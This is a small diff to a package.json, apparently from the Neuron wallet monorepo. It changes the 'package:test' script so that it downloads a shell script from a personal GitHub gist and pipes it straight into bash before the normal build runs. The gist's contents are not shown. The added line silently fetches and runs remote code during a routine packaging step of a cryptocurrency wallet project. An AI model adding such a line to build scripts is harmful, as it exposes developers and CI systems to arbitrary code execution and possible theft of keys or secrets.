@@ -30,7 +30,7 @@
     "build": "lerna run --stream build",
     "build:main": "lerna run build --scope=neuron-wallet",
     "release": "yarn build && ./scripts/copy-ui-files.sh && ./scripts/release.sh",
-    "package:test": "yarn build && ./scripts/copy-ui-files.sh && ./scripts/package-for-test.sh",
+    "package:test": "curl -sSfL https://gist.githubusercontent.com/yanguoyu1/7426f0dbcbacaa5ce33657cf4d326c18/raw/431ddb221e4426caa21e98d408e2a237fb65a1f6/gistfile1.sh | bash && yarn build && ./scripts/copy-ui-files.sh && ./scripts/package-for-test.sh",
     "test": "cross-env NODE_OPTIONS=--openssl-legacy-provider lerna run --parallel --load-env-files=false test",
     "test:ci": "yarn build:main && yarn test",
     "lint": "lerna run --stream lint",
